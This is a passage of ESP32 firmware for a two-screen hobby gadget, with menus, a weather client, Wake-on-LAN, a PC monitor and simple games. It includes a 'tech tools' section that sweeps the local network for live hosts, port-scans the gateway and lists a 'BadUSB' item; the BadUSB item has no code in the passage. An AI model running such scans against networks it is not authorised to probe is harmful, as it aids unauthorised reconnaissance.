    displayLarge.fillRect(0,15,128,10,SH110X_BLACK); displayLarge.setCursor(0,15); displayLarge.printf("Testing .%d ...", i); displayLarge.display();
    if (client.connect(target, 80) || client.connect(target, 22) || client.connect(target, 443)) { client.stop(); lanHosts[lanHostCount++] = target.toString(); }
  } lanScanDone = true; hackShowResults = true;
}
void runPortScan() {
  if (WiFi.status() != WL_CONNECTED) { hackShowResults = true; portResultCount = 0; return; }
  IPAddress gw = WiFi.gatewayIP(); portScanTarget = gw.toString(); portResultCount = 0;
  displayLarge.clearDisplay(); displayLarge.setTextSize(1); displayLarge.setCursor(0,0); displayLarge.print("Port Scan: " + portScanTarget); displayLarge.display();
  WiFiClient client; client.setTimeout(150);
  for (int i = 0; i < 12; i++) {
    displayLarge.fillRect(0,15,128,10,SH110X_BLACK); displayLarge.setCursor(0,15); displayLarge.printf("Testing :%d...", COMMON_PORTS[i]); displayLarge.display();
    bool open = client.connect(gw, COMMON_PORTS[i]); if (open) client.stop(); portResults[portResultCount++] = { COMMON_PORTS[i], open };
  } hackShowResults = true;
}

void drawHackingSmall() {
  displaySmall.setTextSize(1); displaySmall.setCursor(0,0); displaySmall.print("-- TECH TOOLS --"); displaySmall.drawLine(0,10,128,10,WHITE);
  if (!hackShowResults) {
    displaySmall.setCursor(0,16); displaySmall.print("A/B: Navigate"); displaySmall.setCursor(0,28); displaySmall.print("D  : Run Tool");
    displaySmall.setCursor(0,40); displaySmall.print("* : Main Menu");
  } else {
    if (hackMenuSel == 0) { displaySmall.setCursor(0,16); displaySmall.printf("Found: %d nets", wifiNetCount); }
    if (hackMenuSel == 1) { displaySmall.setCursor(0,16); displaySmall.printf("Alive: %d hosts", lanHostCount); }
    if (hackMenuSel == 2) { displaySmall.setCursor(0,16); displaySmall.printf("RSSI: %d dBm", WiFi.RSSI()); int bars = map(constrain(WiFi.RSSI(),-90,-30),-90,-30,0,5); displaySmall.setCursor(0,30); for(int i=0;i<bars;i++) displaySmall.print("|"); }
    if (hackMenuSel == 3) { int openCount = 0; for(int i=0;i<portResultCount;i++) if(portResults[i].open) openCount++; displaySmall.setCursor(0,16); displaySmall.printf("Open: %d/%d ports", openCount, portResultCount); displaySmall.setCursor(0,28); displaySmall.print(portScanTarget.c_str()); }
    if (hackMenuSel == 5) { displaySmall.setCursor(0,16); displaySmall.print("BIOS Error Codes"); displaySmall.setCursor(0,28); displaySmall.print("Scroll A/B"); }
    if (hackMenuSel == 6) { displaySmall.setCursor(0,16); displaySmall.printf("Drops: %d/%d", dropCount, pingTotal); }
    displaySmall.setCursor(0,50); displaySmall.print("#:Back  A/B:Scroll");
  }
}

void drawHackingLarge() {
  displayLarge.setTextSize(1);
  String hackNames[] = {"WiFi Scanner","LAN Scanner","Signal Meter","Port Scanner", "BadUSB Win Act", "BIOS Beep Codes", "Drop Tester"};

  if (!hackShowResults) {
    displayLarge.setCursor(0,0); displayLarge.print("-- TECH TOOLS --"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
    int startIdx = hackMenuSel > 3 ? hackMenuSel - 3 : 0;
    for (int i=0; i<4; i++) {
      int idx = startIdx + i; if(idx > 6) break;
      displayLarge.setCursor(0, 14+i*12);
      if(idx==hackMenuSel) displayLarge.print("> "); else displayLarge.print("  ");
      displayLarge.print(idx+1); displayLarge.print(". "); displayLarge.print(hackNames[idx]);
    }
    return;
  }

  if (hackMenuSel == 0) {
    displayLarge.setCursor(0,0); displayLarge.printf("WiFi: %d found (#)", wifiNetCount); displayLarge.drawLine(0,9,128,9,SH110X_WHITE);
    int visible = 4; int startIdx = hackViewScroll; if(startIdx > wifiNetCount-1) startIdx = max(0,wifiNetCount-1);
    for(int i=0;i<visible && (startIdx+i)<wifiNetCount;i++) {
      int y = 11+i*13; int idx=startIdx+i; displayLarge.setCursor(0,y);
      String ssid = String(wifiNets[idx].ssid); if(ssid.length()>13) ssid=ssid.substring(0,13); displayLarge.print(ssid);
      displayLarge.setCursor(80,y); displayLarge.printf("%ddBm", wifiNets[idx].rssi); displayLarge.setCursor(80,y+7); displayLarge.print(wifiNets[idx].enc==WIFI_AUTH_OPEN ? "OPEN" : "LOCK");
    }
  }
  else if (hackMenuSel == 1) {
    displayLarge.setCursor(0,0); displayLarge.printf("LAN: %d alive (#)", lanHostCount); displayLarge.drawLine(0,9,128,9,SH110X_WHITE);
    if(lanHostCount==0){ displayLarge.setCursor(0,28); displayLarge.print("No hosts found"); return; }
    int startIdx = hackViewScroll; if(startIdx>lanHostCount-1) startIdx=max(0,lanHostCount-1);
    for(int i=0;i<5&&(startIdx+i)<lanHostCount;i++){ displayLarge.setCursor(0, 11+i*10); displayLarge.print(lanHosts[startIdx+i]); }
  }
  else if (hackMenuSel == 2) {
    int rssi = WiFi.RSSI(); displayLarge.setCursor(0,0); displayLarge.printf("Signal: %d dBm", rssi); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
    int quality = map(constrain(rssi,-90,-30),-90,-30,0,100); displayLarge.setCursor(0,13); displayLarge.printf("Quality: %d%%", quality);
    int barW = map(quality,0,100,0,120); displayLarge.drawRect(4,23,120,8,SH110X_WHITE); displayLarge.fillRect(4,23,barW,8,SH110X_WHITE);
    displayLarge.drawRect(0,35,128,28,SH110X_WHITE);
    for(int i=0;i<29;i++){ int x0=map(i,0,29,1,126), x1=map(i+1,0,29,1,126), v0=rssiHist[i], v1=rssiHist[i+1]; if(v0==0&&v1==0) continue;
      int y0=map(constrain(v0,-90,-30),-90,-30,61,36), y1=map(constrain(v1,-90,-30),-90,-30,61,36); displayLarge.drawLine(x0,y0,x1,y1,SH110X_WHITE);
    } displayLarge.setCursor(0,57); displayLarge.print("#:Back");
  }
  else if (hackMenuSel == 3) {
    displayLarge.setCursor(0,0); displayLarge.printf("Ports: %s (#)", portScanTarget.substring(portScanTarget.lastIndexOf('.')+1).c_str()); displayLarge.drawLine(0,9,128,9,SH110X_WHITE);
    if(portResultCount==0){ displayLarge.setCursor(0,28); displayLarge.print("No results yet"); return; }
    int startIdx = hackViewScroll; if(startIdx > portResultCount-1) startIdx = max(0, portResultCount-1);
    for(int i=0; i<5 && (startIdx+i)<portResultCount; i++){
      int y=11+i*10, idx=startIdx+i; displayLarge.setCursor(0, y);
      if(portResults[idx].open) displayLarge.print("[+] "); else displayLarge.print("[-] "); displayLarge.printf("%-5d %s", portResults[idx].port, PORT_NAMES[idx]);
    }
  }
  else if (hackMenuSel == 5) {
    displayLarge.setCursor(0,0); displayLarge.print("- BIOS Beep Codes -"); displayLarge.drawLine(0,9,128,9,SH110X_WHITE);
    int totalBeeps = 9; int startIdx = hackViewScroll; if(startIdx > totalBeeps-4) startIdx = max(0, totalBeeps-4);
    for(int i=0; i<4 && (startIdx+i)<totalBeeps; i++) {
       displayLarge.setCursor(0, 14+i*12); displayLarge.print(biosBeeps[startIdx+i]);
    }
  }
  else if (hackMenuSel == 6) {
    displayLarge.setCursor(0,0); displayLarge.printf("Drops: %d  (8.8.8.8)", dropCount); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
    displayLarge.drawRect(0,15,128,40,SH110X_WHITE);
    for(int i=0;i<29;i++){ 
      int x0=map(i,0,29,1,126), x1=map(i+1,0,29,1,126);
      int y0=map(constrain(pingHist[i],0,250),0,250,54,16); int y1=map(constrain(pingHist[i+1],0,250),0,250,54,16);
      displayLarge.drawLine(x0,y0,x1,y1,SH110X_WHITE);
    }
    displayLarge.setCursor(0,56); displayLarge.print("#:Back  Ping TCP/53");
  }
}

void updatePong() {
  pBallX+=pBallDX; pBallY+=pBallDY;
  if(pBallY<=0){pBallY=0;pBallDY=-pBallDY;}
  if(pBallY>=63){pBallY=63;pBallDY=-pBallDY;}
  pPlayerY += pPlayerVel; pPlayerVel *= 0.6; pPlayerY = constrain(pPlayerY, 0, 64-PAD_H);
  float aiCenter=pAiY+PAD_H/2.0f;
  if(aiCenter<pBallY-1) pAiY+=2.5; else if(aiCenter>pBallY+1) pAiY-=2.5;
  pAiY=constrain(pAiY,0,64-PAD_H);
  if(pBallX<=2+PAD_W&&pBallX>=1&&pBallY>=pPlayerY&&pBallY<=pPlayerY+PAD_H){
    pBallDX=abs(pBallDX)*1.05f; pBallDY+=(pBallY-(pPlayerY+PAD_H/2.0f))*0.08f; pBallX=2+PAD_W+1;
  }
  if(pBallX>=122&&pBallX<=123+PAD_W&&pBallY>=pAiY&&pBallY<=pAiY+PAD_H){
    pBallDX=-abs(pBallDX); pBallDY+=(pBallY-(pAiY+PAD_H/2.0f))*0.08f; pBallX=121;
  }
  pBallDX=constrain(pBallDX,-6.0f,6.0f); pBallDY=constrain(pBallDY,-5.0f,5.0f);
  if(pBallX<0){pAiScore++;pBallX=64;pBallY=32;pBallDX=-2.5f;pBallDY=1.5f;playAlarmSound();if(pAiScore>=7)pongOver=true;}
  if(pBallX>128){pPlayerScore++;pBallX=64;pBallY=32;pBallDX=2.5f;pBallDY=-1.5f;playTone(1500,80);if(pPlayerScore>=7)pongOver=true;}
}

void drawSmallScreen() {
  displaySmall.clearDisplay(); displaySmall.setTextColor(WHITE);
  if(currentApp==T9_INPUT){
    displaySmall.setTextSize(1); displaySmall.setCursor(0,0); displaySmall.println("1:.,?!1  2:abc2");
    displaySmall.println("3:def3   4:ghi4"); displaySmall.println("5:jkl5   6:mno6"); displaySmall.println("7:pqrs7  8:tuv8");
    displaySmall.println("9:wxyz9  0:Space"); displaySmall.println("*:Home   #:Caps"); displaySmall.println("A:Del    D:Save");
  }
  else if(currentApp==MAIN_MENU){
    displaySmall.setTextSize(1); displaySmall.setCursor(0,0);  displaySmall.print("-- NAVIGATION --"); displaySmall.drawLine(0,10,128,10,WHITE);
    displaySmall.setCursor(0,14); displaySmall.print("A   : Up"); displaySmall.setCursor(0,24); displaySmall.print("B   : Down");
    displaySmall.setCursor(0,34); displaySmall.print("D   : Select"); displaySmall.setCursor(0,44); displaySmall.print("* : Home");
    displaySmall.setCursor(0,54); displaySmall.printf(">   : %s", menuItems[menuSelection].c_str());
  }
  else if(currentApp==SETTINGS_MENU){
    displaySmall.setTextSize(1); displaySmall.setCursor(0,0);  displaySmall.print("-- SETTINGS --"); displaySmall.drawLine(0,10,128,10,WHITE);
    displaySmall.setCursor(0,14); displaySmall.print("A/B: Nav  D: Sel"); displaySmall.setCursor(0,24); displaySmall.print("#  : Preview Saver");
    displaySmall.setCursor(0,40);
    if(settingsSelection==0)      displaySmall.print("> WiFi Setup"); else if(settingsSelection==1) displaySmall.print("> Network Info");
    else if(settingsSelection==2) displaySmall.print("> Wake on LAN");  else if(settingsSelection==3) displaySmall.printf("> City: %s", owmCity.c_str());
    else if(settingsSelection==4) displaySmall.printf("> Saver Type: %d", activeScreensaver); else displaySmall.printf("> Saver Time: %dm", screensaverTimeoutMin);
  }
  else if(currentApp==WIFI_MENU){
    displaySmall.setTextSize(1); displaySmall.setCursor(0,0);  displaySmall.print("-- WI-FI SETUP --"); displaySmall.drawLine(0,10,128,10,WHITE);
    displaySmall.setCursor(0,14); displaySmall.print("A/B : SSID / Pass"); displaySmall.setCursor(0,24); displaySmall.print("D   : Edit (T9)");
    displaySmall.setCursor(0,34); displaySmall.print("* : Back"); displaySmall.setCursor(0,46); displaySmall.print("Save -> Reboots!");
  }
  else if(currentApp==NETWORK_INFO){
    displaySmall.setTextSize(1); displaySmall.setCursor(0,0);  displaySmall.print("-- NETWORK --"); displaySmall.drawLine(0,10,128,10,WHITE);
    displaySmall.setCursor(0,14); displaySmall.printf("SSID: %s", mySSID.c_str()); displaySmall.setCursor(0,26); displaySmall.printf("RSSI: %d dBm", WiFi.RSSI());
    displaySmall.setCursor(0,38); displaySmall.printf("GW: %s", WiFi.gatewayIP().toString().c_str()); displaySmall.setCursor(0,50); displaySmall.print("*: Back");
  }
  else if(currentApp==WEATHER) drawClockSmall();
  else if(currentApp==TECH_TOOLS) drawHackingSmall();
  else if(currentApp==GAME) drawGameSmall();
  else if(currentApp==ANIMATION) drawDinoSmall();
  else if(currentApp==PC_MONITOR) {
    displaySmall.setTextSize(1); displaySmall.setCursor(0,8);  displaySmall.print("CPU"); displaySmall.setCursor(0,30); displaySmall.print("GPU"); displaySmall.setCursor(0,52); displaySmall.print("RAM");
    displaySmall.setTextSize(2); displaySmall.setCursor(24,2);  displaySmall.printf("%d%% %dC", valCpuPct, valCpuTemp); displaySmall.setCursor(24,24); displaySmall.printf("%d%% %dC", valGpuPct, valGpuTemp); displaySmall.setCursor(24,46); displaySmall.printf("%d%%", valRamPct);
  }
  displaySmall.display();
}

void drawLargeScreen() {
  displayLarge.clearDisplay(); displayLarge.setTextColor(SH110X_WHITE, SH110X_BLACK); displayLarge.setTextSize(1);
  if(currentApp==MAIN_MENU){
    displayLarge.setCursor(0,0); displayLarge.print("--- OS MAIN MENU ---"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
    displayLarge.drawRect(124,13,4,51,SH110X_WHITE); int skh=51/TOTAL_MENU_ITEMS; int sky=13+(menuSelection*skh); if(menuSelection==TOTAL_MENU_ITEMS-1) sky=64-skh; displayLarge.fillRect(124,sky,4,skh,SH110X_WHITE);
    for(int i=0;i<4;i++){ int idx=menuTopIndex+i; if(idx>=TOTAL_MENU_ITEMS) break; int yp=14+i*12; displayLarge.setCursor(0,yp); if(idx==menuSelection) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print(idx+1); displayLarge.print(". "); displayLarge.print(menuItems[idx]); }
  }
  else if(currentApp==SETTINGS_MENU){
    displayLarge.setCursor(0,0); displayLarge.print("-- SETTINGS --"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
    int startIdx = settingsSelection > 3 ? settingsSelection - 3 : 0;
    String setNames[] = {"1.Wi-Fi Setup", "2.Network Info", "3.Wake on LAN", "4.City: "+owmCity, "5.Saver: "+String(activeScreensaver), "6.Timeout: "+String(screensaverTimeoutMin)+"m"};
    for (int i=0; i<4; i++) { int idx = startIdx + i; if(idx > 5) break; displayLarge.setCursor(0, 14+i*12); if(idx==settingsSelection) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print(setNames[idx]); }
  }
  else if(currentApp==WIFI_MENU){
    displayLarge.setCursor(0,0); displayLarge.print("- Wi-Fi Setup -"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
    displayLarge.setCursor(0,20); if(wifiSelection==0) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print("1. SSID: "); displayLarge.print(mySSID);
    displayLarge.setCursor(0,35); if(wifiSelection==1) displayLarge.print("> "); else displayLarge.print("  "); displayLarge.print("2. Pass: *****");
  }
  else if(currentApp==NETWORK_INFO){
    displayLarge.setCursor(0,0); displayLarge.print("- Network Info -"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE); displayLarge.setCursor(0,25);
    if(WiFi.status()==WL_CONNECTED){ displayLarge.print("Status: Connected\nIP: "); displayLarge.print(WiFi.localIP()); } else displayLarge.print("Status: Disconnected");
  }
  else if(currentApp==T9_INPUT) {
     String t9Title = (t9_inputTarget==INPUT_CITY) ? "Enter City:" : (t9_inputTarget==INPUT_SAVER_TIME ? "Timeout (Min):" : (wifiSelection==0 ? "Enter SSID:" : "Enter Password:"));
     displayLarge.setCursor(0,0); displayLarge.print(t9Title); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
     String st=t9_buffer; if(st.length()>18) st="..."+st.substring(st.length()-15); displayLarge.setCursor(0,25); displayLarge.print(st);
     if(t9_pendingChar!=0&&t9_lastKey>='0'&&t9_lastKey<='9'){
      int nk=t9_lastKey-'0'; String ms=t9_map[nk]; int ml=ms.length(); int ci=t9_tapIndex%ml; int sx=60;
      for(int i=0;i<ml;i++){ char c=ms[i]; if(t9_capsMode>0&&c>='a'&&c<='z') c-=32; displayLarge.setCursor(sx,52); if(i==ci) displayLarge.setTextColor(SH110X_BLACK,SH110X_WHITE); else displayLarge.setTextColor(SH110X_WHITE,SH110X_BLACK); displayLarge.print(c); sx+=8; }
    } displayLarge.setTextColor(SH110X_WHITE,SH110X_BLACK); displayLarge.drawRect(100,48,28,16,SH110X_WHITE); displayLarge.setCursor(105,52); if(t9_capsMode==0) displayLarge.print("abc"); else if(t9_capsMode==1) displayLarge.print("Abc"); else displayLarge.print("ABC");
  }
  else if(currentApp==WEATHER) drawWeatherLarge();
  else if(currentApp==TECH_TOOLS) drawHackingLarge();
  else if(currentApp==GAME) drawGameLarge();
  else if(currentApp==ANIMATION) drawDinoLarge();
  else if(currentApp==PC_MONITOR){
    if(tempSettingStep>0){
      displayLarge.setTextSize(1); displayLarge.setCursor(20,0); displayLarge.print("Set Max Temp"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE); displayLarge.setTextSize(2);
      displayLarge.setCursor(0,20); if(tempSettingStep==1) displayLarge.print(">"); else displayLarge.print(" "); displayLarge.print("Cpu:"); displayLarge.print(tempStrCpu); if(tempSettingStep==1&&isTypingTemp) displayLarge.print("_");
      displayLarge.setCursor(0,44); if(tempSettingStep==2) displayLarge.print(">"); else displayLarge.print(" "); displayLarge.print("Gpu:"); displayLarge.print(tempStrGpu); if(tempSettingStep==2&&isTypingTemp) displayLarge.print("_");
    } else {
      if(pcView=='1'){
        displayLarge.setCursor(0,0);  displayLarge.print(cpuName); displayLarge.setCursor(0,12); float fg=valCpuFreq/1000.0;
        if(sessionMinCpuTemp==999) displayLarge.printf("%.1fGHz L:--c/H:--c",fg); else displayLarge.printf("%.1fGHz L:%dc/H:%dc",fg,sessionMinCpuTemp,sessionMaxCpuTemp);
        displayLarge.drawLine(0,22,128,22,SH110X_WHITE); displayLarge.setCursor(0,26); displayLarge.print(gpuName); displayLarge.setCursor(0,38); displayLarge.printf("VRAM: %.1f/%d GB",valVramUsed,valVramTotal);
        displayLarge.drawLine(0,48,128,48,SH110X_WHITE); displayLarge.setCursor(0,52); displayLarge.printf("RAM %dMHz %.1f/%dGB",valRamSpeed,valRamUsed,valRamTotal);
      }
      else if(pcView=='A'){
        displayLarge.setCursor(0,0); displayLarge.print("Cores Usage (28T):"); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
        for(int i=0;i<28;i++){ int bh=map(core_usage[i],0,100,0,50); int x=8+i*4; int y=64-bh; displayLarge.fillRect(x,y,3,bh,SH110X_WHITE); }
      }
      else if(pcView=='B') drawGraph("CPU Usage:",valCpuPct,cpu_hist); else if(pcView=='C') drawGraph("GPU Usage:",valGpuPct,gpu_hist); else if(pcView=='D') drawGraph("RAM Usage:",valRamPct,ram_hist);
    }
  }
  displayLarge.display();
}

void writeEEPROMString(int a, String d) { int len=d.length(); EEPROM.write(a,len); for(int i=0;i<len;i++) EEPROM.write(a+1+i,d[i]); EEPROM.commit(); }
String readEEPROMString(int a) { int len=EEPROM.read(a); if(len==0||len>64) return ""; String d=""; for(int i=0;i<len;i++) d+=char(EEPROM.read(a+1+i)); return d; }
void playTone(int freq, int dur) { int period=1000000/freq; int hp=period/2; long cyc=((long)freq*dur)/1000; for(long i=0;i<cyc;i++){digitalWrite(BUZZER_PIN,HIGH);delayMicroseconds(hp);digitalWrite(BUZZER_PIN,LOW);delayMicroseconds(hp);} }
void playBootSound() { playTone(523,100);delay(50);playTone(659,100);delay(50);playTone(784,150); }
void playSuccessSound() { playTone(988,100);delay(30);playTone(1319,200); }
void playAlarmSound() { playTone(2000,200);delay(50);playTone(1500,200);delay(50);playTone(2000,200); }
void wakeMyPC() { 
  displayLarge.clearDisplay(); displayLarge.setCursor(10,25); displayLarge.print("Sending Magic Packet..."); displayLarge.display();
  byte mac[6]; sscanf(PC_MAC_ADDRESS,"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",&mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
  byte mp[102]; for(int i=0;i<6;i++) mp[i]=0xFF; for(int i=1;i<=16;i++) for(int j=0;j<6;j++) mp[i*6+j]=mac[j];
  IPAddress bc(255,255,255,255); udp.beginPacket(bc,9); udp.write(mp,sizeof(mp)); udp.endPacket(); playSuccessSound(); delay(1000);
}
void drawGraph(String title, int cur, int* hist) {
  displayLarge.setTextSize(1); displayLarge.setCursor(0,0); displayLarge.print(title); displayLarge.print(" "); displayLarge.print(cur); displayLarge.println("%");
  displayLarge.drawRect(0,15,128,49,SH110X_WHITE);
  for(int i=0;i<HISTORY_SIZE-1;i++){ int x0=map(i,0,HISTORY_SIZE-1,1,126); int x1=map(i+1,0,HISTORY_SIZE-1,1,126); int y0=map(hist[i],0,100,62,16); int y1=map(hist[i+1],0,100,62,16); displayLarge.drawLine(x0,y0,x1,y1,SH110X_WHITE); }
}
void processT9Timer() { if (t9_pendingChar!=0 && (millis()-t9_lastTapTime>1000)) { t9_buffer+=t9_pendingChar; t9_pendingChar=0; if(t9_capsMode==1) t9_capsMode=0; updateDisplay(); } }
void connectWiFi() {
  displayLarge.clearDisplay(); displayLarge.setTextColor(SH110X_WHITE); displayLarge.setTextSize(1);
  displayLarge.setCursor(0,10); displayLarge.print("Connecting to:"); displayLarge.setCursor(0,25); displayLarge.print(mySSID.length()>0?mySSID:"No Saved SSID"); displayLarge.display();
  if(mySSID.length()>0) {
    WiFi.begin(mySSID.c_str(),myPASS.c_str()); int att=0; while(WiFi.status()!=WL_CONNECTED&&att<20){delay(500);att++;}
    if(WiFi.status()==WL_CONNECTED) { udp.begin(localUdpPort); displayLarge.clearDisplay(); displayLarge.setCursor(0,10); displayLarge.print("Wi-Fi Connected!"); displayLarge.setCursor(0,30); displayLarge.setTextSize(2); displayLarge.print(WiFi.localIP()); displayLarge.display(); playSuccessSound(); delay(4000); }
  }
}
void autoDetectCity() {
  displayLarge.clearDisplay(); displayLarge.setTextSize(1); displayLarge.setCursor(5, 25); displayLarge.print("Detecting location..."); displayLarge.display();
  HTTPClient http; http.begin("http://ip-api.com/json/?fields=city,country"); http.setTimeout(5000); int code = http.GET();
  if (code == 200) { String body = http.getString(); int idx = body.indexOf("\"city\":\""); if (idx >= 0) { int end = body.indexOf("\"", idx + 8); String detected = body.substring(idx + 8, end); if (detected.length() > 0) owmCity = detected; } }
  http.end();
}
void fetchWeather() {
  if (WiFi.status() != WL_CONNECTED) return;
  displayLarge.clearDisplay(); displayLarge.setTextSize(1); displayLarge.setCursor(10,28); displayLarge.print("Fetching weather..."); displayLarge.display();
  HTTPClient http; String url = "http://api.openweathermap.org/data/2.5/weather?q=" + owmCity + "&appid=" + String(OWM_API_KEY) + "&units=metric";
  http.begin(url); http.setTimeout(8000); int code = http.GET();
  if (code == 200) {
    String body = http.getString(); int idx;
    idx = body.indexOf("\"temp\":"); if(idx>=0) wxTemp = (int)body.substring(idx+7).toFloat();
    idx = body.indexOf("\"feels_like\":");  if(idx>=0) wxFeels = (int)body.substring(idx+13).toFloat();
    idx = body.indexOf("\"humidity\":");    if(idx>=0) wxHumidity= body.substring(idx+11).toInt();
    idx = body.indexOf("\"description\":\""); if(idx>=0){ int e=body.indexOf("\"",idx+15); wxDesc=body.substring(idx+15,e); }
    idx = body.indexOf("\"speed\":"); if(idx>=0) wxWind = body.substring(idx+8).toFloat();
    idx = body.indexOf("\"name\":\""); if(idx>=0){ int e=body.indexOf("\"",idx+8); wxCity=body.substring(idx+8,e); }
    wxFetched = true;
  } else if (code == 400) { wxDesc = "400: Bad city/key"; wxFetched = true; } else if (code == 401) { wxDesc = "401: Invalid API"; wxFetched = true; } else { wxDesc = "HTTP " + String(code); wxFetched = true; }
  http.end(); lastWxFetch = millis();
}
void initSnake() { snkLen=3; snkDX=1;snkDY=0;snkNDX=1;snkNDY=0; snkScore=0; snkOver=false; snkSpeed=250; for(int i=0;i<snkLen;i++){snk[i].x=(int8_t)(snkLen-1-i);snk[i].y=(int8_t)(SH/2);} placeFood(); lastGameStep=millis(); }
void updateSnake() {
  snkDX=snkNDX; snkDY=snkNDY; int8_t nx=snk[0].x+snkDX, ny=snk[0].y+snkDY;
  if(nx<0||nx>=SW||ny<0||ny>=SH){snkOver=true;playAlarmSound();return;}
  for(int i=0;i<snkLen;i++) if(snk[i].x==nx&&snk[i].y==ny){snkOver=true;playAlarmSound();return;}
  for(int i=snkLen-1;i>0;i--) snk[i]=snk[i-1]; snk[0]={nx,ny};
  if(nx==foodX&&ny==foodY){ snkScore++; if(snkLen<SMAX) snkLen++; if(snkScore%5==0&&snkSpeed>80) snkSpeed-=20; placeFood(); playTone(1500,50); }
}
void placeFood() { bool ok=false; while(!ok){ foodX=random(0,SW); foodY=random(0,SH); ok=true; for(int i=0;i<snkLen;i++) if(snk[i].x==foodX&&snk[i].y==foodY){ok=false;break;} } }
void initPong() { pBallX=64;pBallY=32;pBallDX=2.5f;pBallDY=1.5f; pPlayerY=24;pPlayerVel=0; pAiY=24;pPlayerScore=0;pAiScore=0; pongOver=false; lastGameStep=millis(); }
void initDino(bool manual) { dinoJump=0; dinoVel=0; dinoScore=0; dinoSpeed=2; dinoRunning=true; dinoManual=manual; dinoOver=false; dobs[0]={140,12}; dobs[1]={220,10}; dobs[2]={310,14}; lastDinoStep=millis(); }
void updateDino() {
  dinoScore++; if(dinoScore % 150 == 0 && dinoSpeed < 6) dinoSpeed++;
  if(!dinoManual) { for(int i=0;i<3;i++){ if(dobs[i].x > DINO_X && dobs[i].x < DINO_X + 32 + dinoSpeed*4) { if(dinoJump==0 && dinoVel==0) dinoVel = 9; } } }
  if(dinoVel>0 || dinoJump>0){ dinoJump += dinoVel; dinoVel -= 1; if(dinoJump <= 0){ dinoJump=0; dinoVel=0; } }
  for(int i=0;i<3;i++){
    dobs[i].x -= dinoSpeed;
    if(dobs[i].x < -OBS_W){ int maxX=0; for(int j=0;j<3;j++) if(j!=i && dobs[j].x>maxX) maxX=dobs[j].x; dobs[i].x = maxX + 60 + random(20,60); dobs[i].h = 8 + random(0,10); }
  }
  if(dinoManual) { for(int i=0;i<3;i++){ bool xHit = (DINO_X + DINO_W - 1 > dobs[i].x) && (DINO_X + 1 < dobs[i].x + OBS_W); bool yHit = dinoJump < dobs[i].h; if(xHit && yHit){ dinoOver=true; playAlarmSound(); return; } } }
}
void drawDinoLarge() {
  displayLarge.setTextSize(1);
  if(!dinoRunning){ displayLarge.setCursor(20,20); displayLarge.setTextSize(2); displayLarge.print("DINO RUN"); displayLarge.setTextSize(1); displayLarge.setCursor(22,50); displayLarge.print("Press D to start"); return; }
  displayLarge.drawLine(0, GROUND_Y, 128, GROUND_Y, SH110X_WHITE); int screenY = GROUND_Y - DINO_H - dinoJump;
  displayLarge.fillRect(DINO_X+1, screenY+4, 8, 7, SH110X_WHITE); displayLarge.fillRect(DINO_X+4, screenY, 6, 5, SH110X_WHITE); displayLarge.drawPixel(DINO_X+8, screenY+1, SH110X_BLACK); displayLarge.drawPixel(DINO_X, screenY+5, SH110X_WHITE);
  if((dinoScore/4)%2==0){ displayLarge.drawLine(DINO_X+2, screenY+11, DINO_X+2, screenY+13, SH110X_WHITE); displayLarge.drawLine(DINO_X+6, screenY+10, DINO_X+7, screenY+13, SH110X_WHITE); } else { displayLarge.drawLine(DINO_X+2, screenY+10, DINO_X+3, screenY+13, SH110X_WHITE); displayLarge.drawLine(DINO_X+6, screenY+11, DINO_X+6, screenY+13, SH110X_WHITE); }
  for(int i=0;i<3;i++){ int cx = dobs[i].x, ch = dobs[i].h; if(cx > -OBS_W && cx < 128){ displayLarge.fillRect(cx, GROUND_Y-ch, OBS_W, ch, SH110X_WHITE); displayLarge.fillRect(cx-3, GROUND_Y-ch+2, 3, 4, SH110X_WHITE); displayLarge.fillRect(cx+OBS_W, GROUND_Y-ch+4, 3, 4, SH110X_WHITE); } }
  displayLarge.drawCircle(18, 9, 3, SH110X_WHITE); displayLarge.drawCircle(22, 7, 4, SH110X_WHITE); displayLarge.drawCircle(27, 9, 3, SH110X_WHITE); displayLarge.drawCircle(58, 8, 3, SH110X_WHITE); displayLarge.drawCircle(63, 6, 4, SH110X_WHITE); displayLarge.drawCircle(68, 8, 3, SH110X_WHITE); displayLarge.drawCircle(98, 9, 3, SH110X_WHITE); displayLarge.drawCircle(103, 7, 4, SH110X_WHITE); displayLarge.drawCircle(108, 9, 3, SH110X_WHITE);
}
void drawDinoSmall() { displaySmall.setTextSize(1); displaySmall.setCursor(0,0); displaySmall.print("-- DINO RUN --"); displaySmall.setTextSize(2); displaySmall.setCursor(0,14); displaySmall.printf("Sc:%d", dinoScore); displaySmall.setTextSize(1); displaySmall.setCursor(0,36); displaySmall.printf("Speed: %d", dinoSpeed); displaySmall.setCursor(0,46); if(dinoOver){ displaySmall.print("DEAD! D:Retry"); displaySmall.setCursor(0,56); displaySmall.print("#:Menu"); } else { displaySmall.print("A/D/2/5: Jump"); displaySmall.setCursor(0,56); displaySmall.print("#:Back to menu"); } }
void drawClockSmall() { struct tm ti; if (!getLocalTime(&ti)) { displaySmall.setTextSize(1); displaySmall.setCursor(10,25); displaySmall.print("Syncing time..."); return; } char ts[12], ds[20]; strftime(ts, sizeof(ts), "%H:%M:%S", &ti); strftime(ds, sizeof(ds), "%a %d %b", &ti); displaySmall.setTextSize(2); displaySmall.setCursor(2,8);  displaySmall.print(ts); displaySmall.setTextSize(1); displaySmall.setCursor(14,42); displaySmall.print(ds); }
void drawWeatherLarge() {
  displayLarge.setTextSize(1); if (!wxFetched) { displayLarge.setCursor(10,28); displayLarge.print("Fetching..."); return; }
  String header = wxCity.length()>0 ? wxCity : owmCity; displayLarge.setCursor((128-header.length()*6)/2, 0); displayLarge.print(header); displayLarge.drawLine(0,10,128,10,SH110X_WHITE);
  displayLarge.setTextSize(3); String tempStr = String(wxTemp) + "C"; displayLarge.setCursor(4, 14); displayLarge.print(tempStr); displayLarge.setTextSize(1);
